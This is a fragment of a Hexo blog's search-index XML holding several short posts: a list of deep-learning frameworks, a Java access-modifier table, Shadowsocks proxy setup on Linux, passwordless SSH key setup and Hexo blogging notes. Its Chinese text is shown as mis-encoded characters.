</blockquote>
<p><img src="http://www.ctocio.com/wp-content/uploads/2014/10/graphlab-deeplearning-_thumb.png" alt></p>
<h3 id="å‚è€ƒé“¾æ¥-2"><a href="#å‚è€ƒé“¾æ¥-2" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="http://planckscale.info/?p=226" rel="external nofollow noopener noreferrer" target="_blank">GraphLab Createä½¿æ·±åº¦å­¦ä¹ æ›´easy</a><br><a href="https://blog.inf.ed.ac.uk/graphprocs/2014/11/25/graphlab%E6%96%B0%E7%9A%84%E9%9D%A2%E5%90%91%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%B9%B6%E8%A1%8C%E6%A1%86%E6%9E%B6/" rel="external nofollow noopener noreferrer" target="_blank">GraphLab:æ–°çš„é¢å‘æœºå™¨å­¦ä¹ çš„å¹¶è¡Œæ¡†æ¶</a></p>
<h2 id="Deeplearning4j"><a href="#Deeplearning4j" class="headerlink" title="Deeplearning4j"></a>Deeplearning4j</h2><p>é¡¹ç›®æ–‡æ¡£: <a href="http://deeplearning4j.org/" rel="external nofollow noopener noreferrer" target="_blank">http://deeplearning4j.org/</a><br>é¡¹ç›®åœ°å€: <a href="https://github.com/deeplearning4j/deeplearning4j" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/deeplearning4j/deeplearning4j</a><br>è¯­è¨€: Java/Scala<br>é¡¹ç›®ç®€ä»‹:</p>
<blockquote>
<p>Deeplearning4j is the first commercial-grade, open-source, distributed deep-learning library written for Java and Scala. Integrated with Hadoop and Spark, DL4J is designed to be used in business environments, rather than as a research tool.</p>
<ul>
<li>Versatile n-dimensional array class</li>
<li>GPU integration</li>
<li>Scalable on Hadoop, Spark and Akka + AWS et al</li>
</ul>
</blockquote>
<p><img src="http://deeplearning4j.org/img/schematic_overview.png" alt></p>
<h3 id="å‚è€ƒé“¾æ¥-3"><a href="#å‚è€ƒé“¾æ¥-3" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="http://deeplearning4j.org/compare-dl4j-torch7-pylearn.html" rel="external nofollow noopener noreferrer" target="_blank">DL4J vs. Torch vs. Theano vs. Caffe</a></p>
<h2 id="Caffe"><a href="#Caffe" class="headerlink" title="Caffe"></a>Caffe</h2><p>é¡¹ç›®ä¸»é¡µ: <a href="http://caffe.berkeleyvision.org/" rel="external nofollow noopener noreferrer" target="_blank">http://caffe.berkeleyvision.org/</a><br>é¡¹ç›®åœ°å€: <a href="https://github.com/BVLC/caffe" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/BVLC/caffe</a><br>Slides: <a href="https://docs.google.com/presentation/d/1UeKXVgRvvxg9OUdh_UiC5G71UMscNPlvArsWER41PsU/edit#slide=id.gc2fcdcce7_216_211" rel="external nofollow noopener noreferrer" target="_blank">https://docs.google.com/presentation/d/1UeKXVgRvvxg9OUdh_UiC5G71UMscNPlvArsWER41PsU/edit#slide=id.gc2fcdcce7_216_211</a><br>é¡¹ç›®ç®€ä»‹:</p>
<blockquote>
<p>The Caffe framework from UC Berkeley is designed to let researchers create and explore CNNs and other Deep Neural Networks (DNNs) easily, while delivering high speed needed for both experiments and industrial deployment [5]. Caffe provides state-of-the-art modeling for advancing and deploying deep learning in research and industry with support for a wide variety of architectures and efficient implementations of prediction and learning.</p>
</blockquote>
<p><img src="http://d.hiphotos.baidu.com/baike/c0%3Dbaike92%2C5%2C5%2C92%2C30/sign=520e49ddb51bb0519b29bb7a5713b1d1/5882b2b7d0a20cf4cad4bb2070094b36adaf998d.jpg" alt></p>
<p><img src="http://img.ptcms.csdn.net/article/201507/08/559cebc9330f2_middle.jpg" alt></p>
<h3 id="å‚è€ƒé“¾æ¥-4"><a href="#å‚è€ƒé“¾æ¥-4" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="http://ucb-icsi-vision-group.github.io/caffe-paper/caffe.pdf" rel="external nofollow noopener noreferrer" target="_blank">Caffe: Convolutional Architecture for Fast Feature Embedding</a></p>
<p><a href="http://www.csdn.net/article/1970-01-01/2825166" rel="external nofollow noopener noreferrer" target="_blank">KDnuggetsçƒ­é—¨æ·±åº¦å­¦ä¹ å·¥å…·æ’è¡Œï¼šPylearn2 å±…é¦–ï¼ŒCaffeç¬¬ä¸‰</a></p>
<h2 id="Theano"><a href="#Theano" class="headerlink" title="Theano"></a>Theano</h2><p>é¡¹ç›®ä¸»é¡µ: <a href="http://deeplearning.net/software/theano/" rel="external nofollow noopener noreferrer" target="_blank">http://deeplearning.net/software/theano/</a><br>é¡¹ç›®åœ°å€: <a href="https://github.com/Theano/Theano" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/Theano/Theano</a></p>
<h2 id="Pylearn2"><a href="#Pylearn2" class="headerlink" title="Pylearn2"></a>Pylearn2</h2><p> æ–‡æ¡£åœ°å€: <a href="http://deeplearning.net/software/pylearn2/" rel="external nofollow noopener noreferrer" target="_blank">http://deeplearning.net/software/pylearn2/</a><br> é¡¹ç›®åœ°å€: <a href="https://github.com/lisa-lab/pylearn2" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/lisa-lab/pylearn2</a><br>é¡¹ç›®ç®€ä»‹:</p>
<blockquote>
<p>Pylearn2å’ŒTheanoç”±åŒä¸€ä¸ªå¼€å‘å›¢é˜Ÿå¼€å‘ï¼ŒPylearn2æ˜¯ä¸€ä¸ªæœºå™¨å­¦ä¹ åº“ï¼Œå®ƒæŠŠæ·±åº¦å­¦ä¹ å’Œäººå·¥æ™ºèƒ½ç ”ç©¶è®¸å¤šå¸¸ç”¨çš„æ¨¡å‹ä»¥åŠè®­ç»ƒç®—æ³•å°è£…æˆä¸€ä¸ªå•ä¸€çš„å®éªŒåŒ…ï¼Œå¦‚éšæœºæ¢¯åº¦ä¸‹é™ã€‚</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> æœºå™¨å­¦ä¹  </category>
            
        </categories>
        
        
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java è®¿é—®æƒé™åŒºåˆ«]]></title>
      <url>http://qsli.github.io/2015/10/20/java-permission-control/</url>
      <content type="html"><![CDATA[<h2 id="ç±»æˆå‘˜çš„è®¿é—®æƒé™"><a href="#ç±»æˆå‘˜çš„è®¿é—®æƒé™" class="headerlink" title="ç±»æˆå‘˜çš„è®¿é—®æƒé™"></a>ç±»æˆå‘˜çš„è®¿é—®æƒé™</h2><a id="more"></a>
<table>
<thead>
<tr>
<th>Modifier</th>
<th>Class</th>
<th>Package</th>
<th>Subclass</th>
<th>World</th>
</tr>
</thead>
<tbody>
<tr>
<td>public</td>
<td>âˆš</td>
<td>âˆš</td>
<td>âˆš</td>
<td>âˆš</td>
</tr>
<tr>
<td>protect</td>
<td>âˆš</td>
<td>âˆš</td>
<td>âˆš</td>
<td>x</td>
</tr>
<tr>
<td>no modifier</td>
<td>âˆš</td>
<td>âˆš</td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>private</td>
<td>âˆš</td>
<td>x</td>
<td>x</td>
<td>x</td>
</tr>
</tbody>
</table>
<p>æ²¡æœ‰ä¿®é¥°ç¬¦çš„è¯å°±ç›¸å½“äºpackageå¯è§ï¼Œå¦‚æœå­ç±»ä¸åœ¨åŒä¸€ä¸ªpackageåˆ™ä¹Ÿä¸èƒ½è®¿é—®ç›¸åº”çš„æ–¹æ³•ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote>
<p><a href="https://docs.oracle.com/javase/tutorial/java/javaOO/accesscontrol.html" rel="external nofollow noopener noreferrer" target="_blank">Controlling Access to Members of a Class</a><br><a href="http://blog.csdn.net/johnstrive/article/details/5880357" rel="external nofollow noopener noreferrer" target="_blank">JAVAä¿®é¥°ç¬¦ç±»å‹</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> è®¿é—®æƒé™ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux ä¸‹ä½¿ç”¨ shadowsocks]]></title>
      <url>http://qsli.github.io/2015/10/09/shadowsocks/</url>
      <content type="html"><![CDATA[<h2 id="å®‰è£…shadowsocks"><a href="#å®‰è£…shadowsocks" class="headerlink" title="å®‰è£…shadowsocks"></a>å®‰è£…shadowsocks</h2><p>shadowsocks æ˜¯ä½¿ç”¨ python ç¼–å†™çš„ï¼Œç”¨ python çš„åŒ…ç®¡ç†è½¯ä»¶ pip å®‰è£…å³å¯<br>1.é¦–å…ˆå®‰è£… pip<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install python-pip</span><br></pre></td></tr></table></figure></p>
<p>2.å®‰è£… shadowsocks<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install shadowsocks</span><br></pre></td></tr></table></figure></p>
<h2 id="shadowsocks-ä½¿ç”¨"><a href="#shadowsocks-ä½¿ç”¨" class="headerlink" title="shadowsocks ä½¿ç”¨"></a>shadowsocks ä½¿ç”¨</h2><p>shadowsocks åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€ä¸ª server åå­—å« ssserver ï¼Œä¸€ä¸ª client åå­—å« sslocal<br>é»˜è®¤éƒ½å®‰è£…åœ¨  /usr/local/bin/ ç›®å½•ä¸‹</p>
<h3 id="server-ç«¯"><a href="#server-ç«¯" class="headerlink" title="server ç«¯"></a><strong>server ç«¯</strong></h3><p>serverç«¯ä¸»è¦æ­å»ºåœ¨è‡ªå·±è´­ä¹°çš„vpsä¸Šé¢<br>å¦‚ä¸‹ä»£ç å¯ä½¿å…¶åœ¨åå°è¿è¡Œï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ssserver -p 443 -k password -m rc4-md5 --user nobody -d start</span><br></pre></td></tr></table></figure></p>
<p>å…·ä½“å¯å‚è§ <a href="https://github.com/shadowsocks/shadowsocks/wiki/Shadowsocks-%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E" rel="external nofollow noopener noreferrer" target="_blank">shadowsocks wiki</a></p>
<h3 id="client-ç«¯"><a href="#client-ç«¯" class="headerlink" title="client ç«¯"></a><strong>client ç«¯</strong></h3><p>client ç«¯æ˜¯è¿è¡Œåœ¨éœ€è¦ç§‘å­¦ä¸Šç½‘çš„æœºå™¨ä¸Šçš„<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sslocal -s server_ip -p 443 -l 1080 -k <span class="string">"passwd"</span> -t 600 -m aes-256-cfb &amp;</span><br></pre></td></tr></table></figure></p>
<p>&amp; æ˜¯ä¸ºäº†è®©å…¶åœ¨åå°è¿è¡Œ<br>æŸ¥çœ‹åå°è¿è¡Œçš„ç¨‹åº<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">jobs</span> -l</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1]-  3918 Running                 hexo s &amp;</span><br><span class="line">[2]+  4110 Stopped                 ping www.baidu.com</span><br></pre></td></tr></table></figure>
<p>å°†åå°çš„ç¨‹åºæåˆ°å‰ç«¯  %1   %åé¢çš„æ•°å­—ä»£è¡¨äº†è¦æåˆ°å‰å°çš„ä»»åŠ¡<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ %2</span><br><span class="line">ping www.baidu.com</span><br><span class="line">64 bytes from 180.97.33.107: icmp_req=3 ttl=52 time=14.2 ms</span><br><span class="line">64 bytes from 180.97.33.107: icmp_req=4 ttl=52 time=12.7 ms</span><br></pre></td></tr></table></figure></p>
<p>ä¸Šè¿°å‘½ä»¤å°† Ctrl + Z æŒ‚èµ·çš„ä»»åŠ¡ï¼Œæåˆ°å‰å°å»äº†<br>Ctrl + C æ˜¯ç»ˆæ­¢ç¨‹åº<br>Ctrl + Z æ˜¯æŒ‚èµ·åˆ°åå°</p>
<p>è‡³äºæµè§ˆå™¨ç«¯çš„ä»£ç†æ’ä»¶ï¼Œå°†ä»£ç†åœ°å€é…ç½®æˆ 127.0.0.1 ç«¯å£ 1080 ï¼ˆè¦ä¸å‰é¢è®¾ç½®çš„ç«¯å£ä¸€è‡´ï¼‰<br>é…ç½®ç›¸åº”çš„ä»£ç†è§„åˆ™å³å¯ç§‘å­¦ä¸Šç½‘</p>
<p>è‡³äºå¼€æœºè‡ªåŠ¨å¯åŠ¨ï¼Œå¯ä»¥è‡ªå·±æ‘¸ç´¢</p>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shadowsocks </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sshå…å¯†ç ç™»å½•è®¾ç½®]]></title>
      <url>http://qsli.github.io/2015/10/08/ssh-passwd-free/</url>
      <content type="html"><![CDATA[<h2 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h2><p>  ç°æœ‰Aå’ŒBä¸¤å°æœºå™¨ï¼Œæˆ‘ä»¬è¦å®ç°Aåœ¨sshç™»å½•åˆ°Bçš„æ—¶å€™ä¸ç”¨è¾“å…¥å¯†ç ï¼ŒB-&gt;Açš„è¿‡ç¨‹ç±»ä¼¼</p>
<h2 id="å…·ä½“è¿‡ç¨‹"><a href="#å…·ä½“è¿‡ç¨‹" class="headerlink" title="å…·ä½“è¿‡ç¨‹"></a>å…·ä½“è¿‡ç¨‹</h2><ol>
<li><p>åœ¨<strong>Aæœºå™¨</strong>ä¸Šï¼Œç”Ÿæˆ ssh å…¬é’¥å¯†é’¥å¯¹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç”Ÿæˆçš„æ–‡ä»¶å­˜åœ¨ ~/.ssh/ç›®å½•ä¸‹ï¼Œwindowså­˜åœ¨C\Users\your_name.ssh\ ç›®å½•ä¸‹<br>id_rsaæ˜¯ç§é’¥ï¼Œid_rsa.pubæ˜¯å…¬é’¥</p>
</li>
<li><p>å°†Aä¸­ç”Ÿæˆçš„å…¬é’¥åŠ å…¥åˆ°<strong>Bæœºå™¨</strong>çš„ authorized_keys è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œé»˜è®¤ç›®å½•linuxä¸‹æ˜¯~/.ssh/ ï¼Œæ²¡æœ‰çš„è¯å¯ä»¥è‡ªå·±æ–°å»º<br>æ‹·è´çš„è¿‡ç¨‹å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-copy-id -i å…¬é’¥æ–‡ä»¶è·¯å¾„ -p sshç«¯å£  user@server</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ssh-copy-id  -  install  your  public  key in a remote machineâ€™s authoâ€rized_keys.<br>If the  -i  option  is  given  then  the  identity  file  (defaults  to ~/.ssh/id_rsa.pub) is used,<br>regardless of whether there are any keys in your ssh-agent.</p>
</blockquote>
</li>
</ol>
<p>æ­¤æ—¶Aæœºå™¨ ssh ç™»å½•Bæœºå™¨æ˜¯ä¸éœ€è¦å¯†ç çš„</p>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hexoæ­å»ºåšå®¢]]></title>
      <url>http://qsli.github.io/2015/10/08/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="http://hexo.io/" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" rel="external nofollow noopener noreferrer" target="_blank">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" rel="external nofollow noopener noreferrer" target="_blank">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" rel="external nofollow noopener noreferrer" target="_blank">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/writing.html" rel="external nofollow noopener noreferrer" target="_blank">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/server.html" rel="external nofollow noopener noreferrer" target="_blank">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/generating.html" rel="external nofollow noopener noreferrer" target="_blank">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/deployment.html" rel="external nofollow noopener noreferrer" target="_blank">Deployment</a></p>
<h3 id="hexo-è‰ç¨¿"><a href="#hexo-è‰ç¨¿" class="headerlink" title="hexo è‰ç¨¿"></a>hexo è‰ç¨¿</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new draft &lt;title&gt;</span><br><span class="line">$ hexo server --draft</span><br><span class="line">$ hexo publish &lt;filename&gt;</span><br></pre></td></tr></table></figure>
<h3 id="é™æ€èµ„æº"><a href="#é™æ€èµ„æº" class="headerlink" title="é™æ€èµ„æº"></a>é™æ€èµ„æº</h3><p>å¯¹äºé‚£äº›æƒ³è¦æ›´æœ‰è§„å¾‹åœ°æä¾›å›¾ç‰‡å’Œå…¶ä»–èµ„æºä»¥åŠæƒ³è¦å°†ä»–ä»¬çš„èµ„æºåˆ†å¸ƒåœ¨å„ä¸ªæ–‡ç« ä¸Šçš„äººæ¥è¯´ï¼ŒHexoä¹Ÿæä¾›äº†æ›´ç»„ç»‡åŒ–çš„æ–¹å¼æ¥ç®¡ç†èµ„æºã€‚è¿™ä¸ªç¨å¾®æœ‰äº›å¤æ‚ä½†æ˜¯ç®¡ç†èµ„æºéå¸¸æ–¹ä¾¿çš„åŠŸèƒ½å¯ä»¥é€šè¿‡å°† config.yml æ–‡ä»¶ä¸­çš„ post_asset_folder é€‰é¡¹è®¾ä¸º true æ¥æ‰“å¼€ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_config.yml</span><br><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure></p>
<p>å½“èµ„æºæ–‡ä»¶ç®¡ç†åŠŸèƒ½æ‰“å¼€åï¼ŒHexoå°†ä¼šåœ¨ä½ æ¯ä¸€æ¬¡é€šè¿‡ hexo new [layout] <title> å‘½ä»¤åˆ›å»ºæ–°æ–‡ç« æ—¶è‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚è¿™ä¸ªèµ„æºæ–‡ä»¶å¤¹å°†ä¼šæœ‰ä¸è¿™ä¸ª markdown æ–‡ä»¶ä¸€æ ·çš„åå­—ã€‚å°†æ‰€æœ‰ä¸ä½ çš„æ–‡ç« æœ‰å…³çš„èµ„æºæ”¾åœ¨è¿™ä¸ªå…³è”æ–‡ä»¶å¤¹ä¸­ä¹‹åï¼Œä½ å¯ä»¥é€šè¿‡ç›¸å¯¹è·¯å¾„æ¥å¼•ç”¨å®ƒä»¬ï¼Œè¿™æ ·ä½ å°±å¾—åˆ°äº†ä¸€ä¸ªæ›´ç®€å•è€Œä¸”æ–¹ä¾¿å¾—å¤šçš„å·¥ä½œæµã€‚</title></p>
<h3 id="å†…é“¾"><a href="#å†…é“¾" class="headerlink" title="å†…é“¾"></a>å†…é“¾</h3><p><a href="http://marshal.ohtly.com/2015/09/12/internal-link-and-image-for-hexo/" rel="external nofollow noopener noreferrer" target="_blank">Hexoä½¿ç”¨å†…é“¾åŠæ–‡ç« ä¸­åŠ å…¥å›¾ç‰‡çš„æ–¹æ³•</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% post_link ec2-build-md %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="seo"><a href="#seo" class="headerlink" title="seo"></a>seo</h3><p><a href="http://www.jianshu.com/p/86557c34b671" rel="external nofollow noopener noreferrer" target="_blank">Hexo Seoä¼˜åŒ–è®©ä½ çš„åšå®¢åœ¨googleæœç´¢æ’åç¬¬ä¸€</a></p>
<h2 id="Markdown-è¯­æ³•ç®€ä»‹"><a href="#Markdown-è¯­æ³•ç®€ä»‹" class="headerlink" title="Markdown è¯­æ³•ç®€ä»‹"></a>Markdown è¯­æ³•ç®€ä»‹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1ã€åˆ†æ®µï¼š ä¸¤ä¸ªå›è½¦</span><br><span class="line"></span><br><span class="line">2ã€æ¢è¡Œ ä¸¤ä¸ªç©ºæ ¼ + å›è½¦</span><br><span class="line"></span><br><span class="line">3ã€æ ‡é¢˜ #~###### äº•å·çš„ä¸ªæ•°è¡¨ç¤ºå‡ çº§æ ‡é¢˜ï¼Œå³Markdownå¯ä»¥è¡¨ç¤ºä¸€çº§æ ‡é¢˜åˆ°å…­çº§æ ‡é¢˜</span><br><span class="line"></span><br><span class="line">4ã€å¼•ç”¨ &gt;</span><br><span class="line"></span><br><span class="line">5ã€åˆ—è¡¨ *ï¼Œ+ï¼Œ-ï¼Œ1.ï¼Œé€‰å…¶ä¸­ä¹‹ä¸€ï¼Œæ³¨æ„åé¢æœ‰ä¸ªç©ºæ ¼</span><br><span class="line"></span><br><span class="line">6ã€ä»£ç åŒºå— å››ä¸ªç©ºæ ¼å¼€å¤´</span><br><span class="line"></span><br><span class="line">7ã€é“¾æ¥ [æ–‡å­—](é“¾æ¥åœ°å€)</span><br><span class="line"></span><br><span class="line">8ã€å›¾ç‰‡ &#123;% å›¾ç‰‡åœ°å€ å›¾ç‰‡è¯´æ˜ %&#125;</span><br><span class="line">ï¼Œå›¾ç‰‡åœ°å€å¯ä»¥æ˜¯æœ¬åœ°è·¯åŠ²ï¼Œä¹Ÿå¯ä»¥æ˜¯ç½‘ç»œåœ°å€</span><br><span class="line"></span><br><span class="line">9ã€å¼ºè°ƒ **æ–‡å­—**ï¼Œ__æ–‡å­—__ï¼Œ_æ–‡å­—_ï¼Œ*æ–‡å­—*</span><br><span class="line"></span><br><span class="line">10ã€ä»£ç </span><br></pre></td></tr></table></figure>
<blockquote>
<p><a href="http://www.jianshu.com/p/1e402922ee32/" rel="external nofollow noopener noreferrer" target="_blank">Markdownâ€”â€”å…¥é—¨æŒ‡å—</a></p>
</blockquote>
<h2 id="åœ¨Hexoä¸­æ’å…¥gist"><a href="#åœ¨Hexoä¸­æ’å…¥gist" class="headerlink" title="åœ¨Hexoä¸­æ’å…¥gist"></a>åœ¨Hexoä¸­æ’å…¥gist</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gist 1f10fa5b8b76f3b5efaf74ad3d6da413  %&#125;</span><br></pre></td></tr></table></figure>
<p> å…¶ä¸­ä¸€é•¿ä¸²æ˜¯gistç”Ÿæˆçš„id</p>
<h2 id="ä½¿ç”¨markdownæ¥ç”»mindmap"><a href="#ä½¿ç”¨markdownæ¥ç”»mindmap" class="headerlink" title="ä½¿ç”¨markdownæ¥ç”»mindmap"></a>ä½¿ç”¨markdownæ¥ç”»mindmap</h2><blockquote class="pullquote mindmap"><p>#ä¸»é¢˜</p>
<p>##ä¸€çº§åˆ†æ”¯</p>
<p>###äºŒçº§åˆ†æ”¯</p>
<p>##ä¸€çº§åˆ†æ”¯</p>
<p>##ä¸€çº§åˆ†æ”¯</p>
<p>###äºŒçº§åˆ†æ”¯</p>
<p>####ä¸‰çº§åˆ†æ”¯</p>
</blockquote>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul>
<li><a href="http://blog.gezhiqiang.com/2016/11/27/hexo-inner-link/" rel="external nofollow noopener noreferrer" target="_blank">hexoçš„ç«™å†…é“¾æ¥é—®é¢˜ | Node å°æ ˆ</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo install </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
